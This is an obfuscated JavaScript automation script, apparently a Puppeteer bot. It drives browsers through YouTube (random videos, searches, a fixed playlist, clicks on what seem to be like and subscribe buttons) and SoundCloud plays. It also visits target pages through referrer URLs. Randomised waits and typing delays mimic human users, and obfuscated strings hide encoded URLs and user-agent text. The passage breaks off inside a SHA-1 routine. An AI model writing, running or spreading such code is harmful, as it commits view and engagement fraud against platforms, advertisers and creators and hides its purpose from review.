function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1585 + -0x5 * 0x1d1 + 0x1 * 0x1e9a);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a0 = d,
  Z = c,
  Y = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xfe8 + -0x1de9 + 0x30e * 0xf))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1 * -0x142a + -0x1 * -0x539 + -0x55 * -0x2d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * -0x1fda + 0xbb0d + -0x1 * 0x2603 + (-0x1 * -0x26c3 + -0x60cd * 0x1 + 0x1 * 0x74a2) * random()) : await standardWaitForNetIdle(f), await wait(-0x65b * 0x4 + 0x1 * 0xadb + 0x12d * 0x1d + (0x2f7f + 0x286a + -0x30d9) * random()), -0x4b * -0x67 + -0x44 * 0x35 + 0x406 * -0x4;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x11 * 0x229 + -0x4 * -0x2e7 + -0x1ccd), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xa * 0x90 + 0x110b * 0x1 + -0x16aa;
}
async function randomWait() {
  return await wait(-0x1 * 0x1741 + 0xa5 * 0x6 + 0x26eb + (0x1362 * 0x2 + -0x9bd * 0x3 + 0x9fb) * random()), -0x623 * 0x3 + 0x1 * -0xf35 + 0x1c5 * 0x13;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xb77 * 0x1 + 0x2 * 0x191 + -0xe99 * 0x1, -0x11 * 0x21a + 0xbb * 0x25 + 0x8ba), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x14ae4 + 0x1 * -0x172b7 + 0x3a7fb) * getRandomInt(-0x1ca5 + 0x1 * -0x99b + -0x2 * -0x1321, -0x1574 * 0x1 + 0x1a * 0x13f + 0xaed * -0x1), h)), -0xaa8 + 0xd1a + 0x5 * -0x7d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x1976 + -0x30 * 0xad + 0x6fa;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1572 + -0xa54 * 0x1 + -0xb1d]['split']('\x20');
    for (let k = -0x1 * 0xfa3 + -0x23d7 * 0x1 + -0x4ae * -0xb; k < i['length']; k += 0x1d20 + 0x251c + -0x423a * 0x1)
      j += i[k] * h[i[k + (-0x13df * 0x1 + -0x166 * -0xd + 0x1b2)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * 0x1cd + -0x15a8 + 0x13e1)['map'](l => Array['from'](l['children']))['flat'](0x98 * 0xb + -0x7f * -0x7 + -0x2 * 0x500)['map'](l => l['childNodes'][0x15b * -0x17 + 0x3 * -0x2f + 0x1fbb]['childNodes'][-0x18c4 + 0x1 * -0x17ff + 0x30c3]['childNodes'][-0xf0b + 0x1c89 + -0xd7d]['childNodes'][-0x64 * 0x50 + 0x222a + -0x2ea * 0x1]['childNodes'][0x3a * -0xd + -0x6 * -0x5d8 + -0x201d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x7ed * -0x3 + 0x1e92 + -0x3271, -0x2433 + -0x2122 + 0x58dd * 0x1)), await f['click']('#__hookedV' + R(0x8)), await wait(-0xa * 0x70c + -0x451c + -0xc62c * -0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x8529 + -0x562 * -0x1d + -0x36e3) * getRandomInt(-0xd44 + -0x4 * -0x79b + -0x1126, 0x857 + 0x600 + 0xe52 * -0x1), h);
  return await wait(i), 0x5c1 + -0x551 + -0x6f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math[S(0x7, 'aG[#')](Math['random']() * h['length'])])['children'][-0x572 + 0x7d * -0x1 + 0x5ef]['children'][-0x2569 + 0x72 * 0x13 + 0x1cf3]['children'][0x933 * -0x2 + -0x735 + -0x11d * -0x17]['children'][0xb * -0x97 + -0x4 * 0x8d9 + 0x1 * 0x29e1]['children'][0x14e3 + -0x1e09 + 0x2 * 0x493]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x25a1 + 0xa * 0x1fc + 0x11ca;
}

function a() {
  const bn = [
    'stjYy1j0ytDxsG',
    'FhhcGumUeSohWR0',
    'rver',
    'AMlcLhOYhCohW6VcPG',
    'CSo6qCklW6BcJW',
    'C2v0vwLUDdmY',
    'Ahr0Chm6lY9Tzq',
    'mmoyqrar',
    'AwruB1DHDgnO',
    'send',
    'Android\x2010',
    'W6ldSKjZW6dcT8kzdJ97',
    'W4L2W77dMIrrWP9/W5Ks',
    'zgL1Bs5JB20Vqa',
    'rket-1b665',
    'zs9KAxnJB3jKlG',
    'oCoxwXiglmo4awZcGa',
    'W69rf8oPf8ozjteGAG',
    'qYJdLMJdPcP+W5pcUCk9',
    'tuPYA3LSAZDPrq',
    ')\x20AppleWeb',
    'er.io..),_',
    '44lRVYQ38E',
    'Ahr0Chm6lY9NCG',
    'easyfork.o'
  ];
  a = function() {
    return bn;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1585 + -0x5 * 0x1d1 + 0x1 * 0x1e9a);
    let h = e[f];
    if (c['nfJRnb'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x487 * -0x3 + 0x2226 * -0x1 + 0x2fbb * 0x1, r, s, t = -0x2 * 0x3f5 + 0x12e + 0x6bc; s = m['charAt'](t++); ~s && (r = q % (-0x11b * 0xe + 0x14ea * 0x1 + 0x1 * -0x56c) ? r * (-0x65d + 0x895 + 0x3 * -0xa8) + s : s, q++ % (-0x1 * -0x38 + -0x45 * 0x1 + -0x1 * -0x11)) ? o += String['fromCharCode'](0x1 * 0x22e7 + -0x17aa + 0x17 * -0x72 & r >> (-(0x5 * -0x4e7 + 0x175 * 0x16 + -0x3 * 0x283) * q & -0x1 * 0xf7f + -0x9 * 0x137 + -0x69d * -0x4)) : 0x25 * 0xe9 + 0x4 * 0x7fa + -0x67 * 0xa3) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * -0x13b2 + 0x1e * 0x30 + -0x709 * -0x2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * 0x1741 + 0xa5 * 0x6 + 0x1373))['slice'](-(0x1362 * 0x2 + -0x9bd * 0x3 + -0x98b));
        }
        return decodeURIComponent(p);
      };
      c['EFCgMy'] = i, b = arguments, c['nfJRnb'] = !![];
    }
    const j = e[-0x623 * 0x3 + 0x1 * -0xf35 + 0x296 * 0xd],
      k = f + j,
      l = b[k];
    return !l ? (h = c['EFCgMy'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1357 + -0x23a7 * -0x1 + -0xfec + (0x3af + 0x20dc + -0x2459) * random()
  }), await wait(0x1 * 0x447 + 0x1 * -0xc8c + 0xa39 + (0xc0c + -0x21f7 + 0x1717) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const T = b;
    if (!await f[T(0x1, 'EiHS')](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x152b + 0x791 + -0x1cba * 0x1]['childNodes'][-0x13f0 + -0x1 * -0x64e + -0x1 * -0xda3]['childNodes'][-0xe * 0x5b + 0x1 * -0x1951 + 0xf26 * 0x2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x18eb + 0x10d2 * 0x2 + -0x8b4]['childNodes'][-0x1bb * -0x1 + -0x4b2 * -0x7 + -0x2299]['childNodes'][-0x8 * -0xcb + -0x7cf + -0x179 * -0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1 * -0x194c + -0x22df + 0x994),
          r = 0x2 * 0x6e3 + 0x4d5 * 0x7 + -0x2f99;
        for (let u = -0x41e * 0x9 + -0xeb6 * 0x1 + 0x4 * 0xcf1; u < q['length']; u += 0x200e + -0x402 * 0x8 + 0x4)
          r += q[u] * k[q[u + (-0x3 * -0x584 + -0x2 * 0x1105 + 0x117f)]];
        return r;
      }(n);
  });
  await wait((0x51d * -0x12 + 0x5 * -0x10f6 + 0xeb70) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x17931 + 0x27 * 0x461 + 0x1b8ca * 0x1) * getRandomInt(-0x248c + -0x2e5 * 0x1 + -0x63 * -0x66, 0x1171 + -0x17f2 + 0x68b), h + (0xe5 * 0xd + 0x1bac + 0xf1 * -0x15));
  return await wait(i), -0x1 * 0x72d + 0x2 * -0x5e5 + 0x12f8;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x10d0 + -0x17eb + 0x28bb), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const U = b;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')[U(0x12, 'aovz') + 'te']('id', '__lllll');
      }, -0x5d4 + 0x15e2 + -0xb9 * 0x6 + (0x4c * 0x16 + -0x2d5 + -0x35 * -0x1) * Math['random']());
    });
  }, 0xb8d * -0x1 + 0x22 * -0x195 + 0x86d * 0xb);
  await wait(-0xf178 + -0xbfa1 * -0x9 + -0x1 * 0x13751);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * 0xf892 + 0x91aa + -0x9fdc) * getRandomInt(0x585 * -0x7 + -0x976 * 0x2 + 0x1 * 0x3993, 0x24ba + -0xb81 + -0x6 * 0x430)), clearInterval(h), -0x18bc + -0x94e + 0x220b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0x1855 + -0x1f3 * -0x3 + -0x1e2e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x45c + 0x141 * 0x17 + -0x187a;
    await randomWait();
  }
  return 0x2 * 0x68e + 0x1213 + -0x1f2e;
}

function fetchRandomSC() {
  return Math['random']() <= 0x10e0 + 0x5bf + -0x169f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2248 + 0x18c2 + 0x3b0a * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x61f * -0x6 + -0xed0 + -0x15ea + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x25 * -0x21 + 0x7b5 + -0x2f0;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xe7f5 + 0x4d7 * 0x31 + 0x1 * 0xaa96 + getRandomInt(0x3241 + 0x74a7 * 0x1 + -0x6c50, 0xe16f + -0x2302 + 0x1 * -0x493d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1659 + 0x1 * -0x347 + -0x3 * -0x88b), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x47 * 0x71 + 0x2 * -0x534 + -0x1 * 0x14ef;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x29 * -0x44 + 0x1deb + -0x28cf, 0x1eb7 + 0x2 * 0xe2 + -0x1b3 * 0x13)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x634 + 0xfa9 + -0xe0d + floor((0x124a * 0x1 + 0x107 * 0x16 + -0x24fc) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xc218aeee + 0x3c0bb418 + 0x1 * -0x7e246306),
          -0x1 * 0x70630b + 0xec72b2 + 0x3f059,
          -0x2b6e + 0xc6c0 + -0x1b52,
          -0x1284 + -0xe0 * 0x14 + -0x26 * -0xf6
        ], y = [
          -0x1cf9 + -0x1b7a + 0x388b,
          -0x24 * -0xe9 + -0x1 * -0x12e5 + 0x3 * -0x1133,
          -0x258e + 0xcc2 + 0x1c6 * 0xe,
          0x13fa + -0x17d * 0xa + -0x518
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xa8 * -0x14 + 0x187f * 0x1 + -0x5 * 0x246)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xda1 + 0xf3 * -0x15 + 0x2190; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1b * 0x145 + 0x946 + 0x1901) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x24bc + -0x1 * 0x1b7a + 0x4036] = A[0x88 * 0x3 + 0xc * 0xf2 + -0x670 * 0x2] = A[0x25da + 0x24db + -0x4ab4] = A[0x885 + -0x8b8 + 0x35] = A[0x1980 + -0x2 * 0x189 + 0x3 * -0x779] = A[-0x1372 * -0x1 + 0x98d + -0x9a9 * 0x3] = A[0x164a + 0x6 * -0x653 + -0x1 * -0xfad] = A[0x26a + -0x40f + -0x1 * -0x1ab] = A[0x26d3 + 0x3e3 * 0x2 + -0x2e92] = A[-0xfce + -0x1f2b * -0x1 + -0xf55] = A[0x17 * 0x199 + -0x2082 + 0x4 * -0x10d] = A[-0xb93 + 0x22 * -0xb + 0xd13] = A[0x22f * 0x2 + 0x6e6 * 0x3 + 0x69 * -0x3d] = A[-0x1276 + -0x1 * 0xc93 + 0x1f15] = A[0x3ab + -0x998 + -0x5fa * -0x1] = A[-0xf56 + 0x94 * -0x2a + -0x9eb * -0x4] = A[0x842 * 0x1 + 0x19b2 + -0x21e5] = -0x13 * 0xa + 0x6 * -0x61 + 0x304, this['blocks'] = A) : this['blocks'] = [
                0x2 * -0x76b + -0x24f6 * 0x1 + 0x1144 * 0x3,
                0x1 * 0x1eec + 0x624 + -0x2510,
                -0x1b79 + 0x10bb + 0xabe,
                -0x1 * -0x1697 + 0x1 * -0x4c2 + -0x11d5,
                -0x141c + -0x2 * -0x1318 + 0x1214 * -0x1,
                0x1 * 0x10d5 + 0x99e + -0x1a73,
                -0x225a * -0x1 + -0x4 * -0x6c4 + -0x3d6a,
                0x1c2c + 0x5ad * 0x4 + -0x32e0,
                0xce7 + -0x11 * 0xfe + 0x1 * 0x3f7,
                -0x1 * -0x152b + -0x89c + 0x5 * -0x283,
                -0x99e * -0x2 + -0x270b + 0x1cd * 0xb,
                0x17ed + -0xace + -0x1 * 0xd1f,
                -0x1f17 + -0x1491 + 0x33a8,
                -0x167a + -0xcc * -0xc + 0xcea,
                0x1fc8 + -0x1db6 + 0x35 * -0xa,
                -0xa10 + 0x19fe + 0x7f7 * -0x2,
                -0x5bc + -0x702 + 0xcbe
              ], this['h0'] = -0x23adf6cd + 0x312d * 0x42227 + -0x4f * 0xd068e3, this['h1'] = -0x1 * -0x2a4e6201 + 0x14 * -0xf382a9 + 0x13e1a7 * 0xae4, this['h2'] = 0x9c2b9fae + 0x7cb35 * 0x97d + -0x4d63d891, this['h3'] = -0x2c139da + 0x120dcac + 0x11d2b1a4, this['h4'] = 0x3f24302 * 0x25 + 0x1441ab * 0x7de + -0x6d8d6ca4, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1 * 0xf97 + -0x1068 + 0x1fff, this['finalized'] = this['hashed'] = -0x1 * -0xe56 + -0x4c3 + 0x3 * -0x331, this['first'] = -0x1847 + -0x1f7d + 0x37c5;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x12 * 0xc3 + -0xa7e + 0x19c * -0x2, O = J['length'] || 0x2327 + -0x94 * 0xc + -0x1c37, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xb3 * 0x1f + -0x1675 + 0xc8, P[-0xde5 * 0x1 + 0x266b + 0x92 * -0x2b] = this['block'], P[0x18c + -0xf * 0x8e + 0x6d6] = P[-0x3 * 0x91a + -0x15 * 0x27 + -0x2c6 * -0xb] = P[-0x617 * 0x2 + 0xa5 * -0x16 + 0x1a5e] = P[-0x18cb + 0x5 * -0x7c9 + 0x4e7 * 0xd] = P[0x1 * 0x1549 + -0x1 * -0xce2 + -0x7 * 0x4e1] = P[0x2 * 0xa46 + 0x26 * 0xb3 + -0x2f19] = P[0xd6d * -0x2 + 0x41c * 0x1 + 0x16c4] = P[0x2065 + -0x3 * 0x320 + -0x16fe] = P[-0x7 * 0x308 + -0x268 * -0x3 + 0xe08] = P[0x1 * -0x13eb + 0x1 * 0x1524 + 0x1 * -0x130] = P[-0x5b4 * 0x6 + 0xb * 0x155 + -0x1 * -0x139b] = P[-0x19c + -0x18 * -0x169 + -0xabb * 0x3] = P[0x1f1 * 0x9 + -0x1753 + 0x5e6] = P[0x1 * 0x1989 + 0x511 * 0x1 + 0x365 * -0x9] = P[-0x773 * -0x4 + 0x399 + 0xf * -0x239] = P[0x2327 + 0x1 * -0x36e + -0x1faa] = -0xb4f + -0x19cc + -0x54d * -0x7), K) {
                    for (N = this['start']; M < O && N < 0x1 * 0x29f + 0x1ab8 + 0x1d17 * -0x1; ++M)
                      P[N >> 0x1e * 0x35 + -0x1a5f + -0x3 * -0x6b9] |= J[M] << y[-0xd81 + -0x1 * -0x165b + -0x8d7 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x8 * 0x17 + -0xd07 + 0x1 * 0xdff; ++M)
                      (L = J['charCodeAt'](M)) < -0x69e + 0xb3 * 0x7 + 0x1 * 0x239 ? P[N >> -0xa0 + -0x2 * -0xd2d + -0x19b8] |= L << y[-0x59 * 0xe + 0xdd4 + -0x1d * 0x4f & N++] : L < -0x3b * -0x50 + -0xa5 * 0x37 + 0x1903 ? (P[N >> -0xab * -0xb + 0x384 * -0xa + 0x1bd1] |= (-0xf07 * 0x1 + 0x5 * 0x34c + -0x1 * 0xb5 | L >> 0xa14 * -0x2 + -0x2 * 0x96b + -0x1 * -0x2704) << y[0x3 * -0xbc5 + 0x1ff6 * -0x1 + 0x21a4 * 0x2 & N++], P[N >> 0x46 * -0x21 + 0x1 * -0x4e7 + 0xdef] |= (-0x1848 + 0xdc9 + -0xaff * -0x1 | 0x9a2 + -0x19 * 0x35 + -0x31 * 0x16 & L) << y[-0x1f49 + 0x595 * -0x1 + 0x9 * 0x419 & N++]) : L < -0x3d97 + 0x93b * 0x1d + -0x1 * -0x9e8 || L >= 0x10387 + -0x1ae07 + 0x30 * 0x838 ? (P[N >> 0x5 * -0x2bf + -0x1bd8 + 0x851 * 0x5] |= (-0xa99 * -0x3 + 0x3 * 0x6d5 + -0x336a | L >> 0x238b + -0x421 * 0x3 + -0x44 * 0x57) << y[-0xdea + -0x3aa * 0x1 + 0x5dd * 0x3 & N++], P[N >> -0x2355 + 0x3fd * 0x5 + 0xf66] |= (-0x22a7 + -0x1 * 0x1406 + -0x7d * -0x71 | L >> 0x1a87 + 0x693 * 0x3 + -0x2e3a & 0x1ecc + 0x1c6c + -0x1e7 * 0x1f) << y[0x9f * -0x1d + -0x114 * 0x1f + -0x3 * -0x1126 & N++], P[N >> -0x4 * 0x7f + 0x2574 + 0x66 * -0x59] |= (0x9f5 + 0x1b3 * 0x1 + -0x54 * 0x22 | -0x1 * -0x1bc9 + -0x164 + -0x1 * 0x1a26 & L) << y[-0xf5 * 0xc + -0xf2 * 0x26 + -0x1 * -0x2f6b & N++]) : (L = 0x6ce * -0x29 + -0x29 * -0x8f2 + -0x1bc * -0x61 + ((-0x16cb + 0x18c3 + 0x207 & L) << 0x1 * -0x1bbf + 0x9de + -0xb * -0x1a1 | 0x1de * -0x4 + 0x696 * -0x4 + -0x1 * -0x25cf & J['charCodeAt'](++M)), P[N >> -0x1 * 0x74b + -0x3 * 0x823 + -0x52 * -0x63] |= (0x16da + -0x21de + -0x12 * -0xaa | L >> 0x1a4b + 0x19c2 + 0x33fb * -0x1) << y[-0x173b + 0x7c * 0x1e + 0xa * 0xdf & N++], P[N >> 0x24 * 0xa2 + -0x13e5 * -0x1 + -0x2aab] |= (0x1 * 0x1b55 + 0x1 * 0x1006 + -0xe49 * 0x3 | L >> -0x248e + 0x37e + -0xa3 * -0x34 & -0x8aa * -0x4 + -0x3 * -0x2cf + -0x1 * 0x2ad6) << y[-0x1d1c + -0x697 * 0x4 + 0x1 * 0x377b & N++], P[N >> -0x1215 + -0x2cb * -0x2 + 0xc81 * 0x1] |= (-0x1e8 + 0x2 * -0x207 + -0x2 * -0x33b | L >> -0x13 * -0xc2 + -0x1525 + 0x6c5 & 0x2 * 0xfda + 0x821 + 0x12 * -0x233) << y[-0xb98 + 0x1722 + -0xb87 & N++], P[N >> -0x28e + 0x2 * -0xfbf + 0x220e] |= (0x1f19 + 0x92d + 0x2 * -0x13e3 | -0x13 * -0x49 + -0x13a * 0x9 + 0x2ef * 0x2 & L) << y[0x2 * 0x3b4 + -0xf0b * 0x1 + -0x1 * -0x7a6 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x27 * -0x8f + 0x9b5 + 0x1 * 0xc54 ? (this['block'] = P[0x2 * 0xe6e + 0x4 * 0xe9 + -0x2070], this['start'] = N - (0x752 * 0x3 + -0x3 * 0x303 + 0x289 * -0x5), this['hash'](), this['hashed'] = 0x158 * 0x13 + 0x188f * -0x1 + -0xf8) : this['start'] = N;
                }
                return this['bytes'] > -0x6191f14 + -0x5c * 0xd94674 + 0x1542e70c3 && (this['hBytes'] += this['bytes'] / (0x5e4880a0 + -0xa7a11ff4 + -0xf * -0x15f4d76c) << -0x1425 + -0x5 * -0x7bf + -0x1296, this['bytes'] = this['bytes'] % (0x1e4552bc + -0x1 * -0x5ac1d1b8 + 0x2ca9e * 0x305a)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x939 + 0xd1 + 0x7 * -0x16f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
